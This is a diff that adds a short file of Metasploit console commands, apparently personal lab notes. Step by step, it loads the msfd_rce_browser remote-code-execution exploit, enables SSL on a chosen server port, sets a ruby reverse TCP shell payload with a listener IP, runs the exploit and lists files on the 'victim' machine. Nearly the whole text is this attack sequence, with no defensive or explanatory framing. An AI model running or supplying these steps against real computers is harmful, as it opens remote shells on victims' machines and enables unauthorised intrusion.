@@ -1,0 +1,26 @@
+msfconsole
+
+search tcp
+
+use exploit/multi/browser/msfd_rce_browser 
+
+show -h options 
+
+set srvport 1244 
+
+show options 
+
+set ssl true 
+
+show payloads 
+
+set payload ruby/shell_reverse_tcp 
+
+In victim pc ipconfig 
+
+set lhost 192.168.90.114
+
+show options
+
+exploit 
+ls -a 
